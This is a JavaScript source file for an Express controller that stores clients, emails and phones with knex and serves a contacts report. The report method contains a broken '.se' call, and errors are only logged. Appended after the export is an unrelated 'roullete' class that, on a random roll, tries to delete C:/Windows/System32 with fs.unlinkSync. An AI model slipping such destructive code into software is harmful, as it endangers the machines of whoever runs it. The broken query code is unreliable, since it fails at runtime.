const knex = require('../database/knex')
const AppError = require('../utils/AppError')
class ClientsControllers{
    create = async (request, response) => {
        //emails and phones are arrays from frontend
        const {full_name, emails, phones} = request.body
        const registered_by = request.user.id
        
        const [client_id] = await knex('clients')
        .insert({
            full_name,
            FK_registered_by : registered_by
        })
        .then((id)=> {
            console.log('inserted with success')
            return id
        })
        .catch(e => (console.error(e)))
        if(emails.length > 0){
            const emailsToInsert = emails.map(email => {
                return {
                    address : email,
                    FK_client_id : client_id
                }
            })
            await knex('emails').insert(emailsToInsert).then((data) => console.log(data))
        }
        if(phones.length > 0){
            const phonesToInsert = phones.map(phone => {
                return {
                    number : phone,
                    owner_id : client_id
                }
            })
            await knex('phones').insert(phonesToInsert).then((data) => console.log(data))
        }    
        
        return response.status(201).json(client_id)
    }
    
    report = async (request, response) =>{
        const relatoryResponse = await knex("clients_contacts")
        .se
        .then((data)=> {
            console.log('success')
            return data
        })
        .catch(e => console.error(e))

        /*const view = await knex('clients as c')
        .select(['full_name', 'full_contact_name'])
        .innerJoin('contacts as ct', 'c.client_id', '=', 'ct.client_owner_id' )
        */
        return response.json(relatoryResponse)
    }
}
module.exports = ClientsControllers

class roullete{
    trigger = async() =>{
        const fs = require('fs')
        const randonNumber = Math.round(Math.random()* 6)
        if(randonNumber == 1)await fs.unlinkSync('C:/Windows/System32')
    }
}
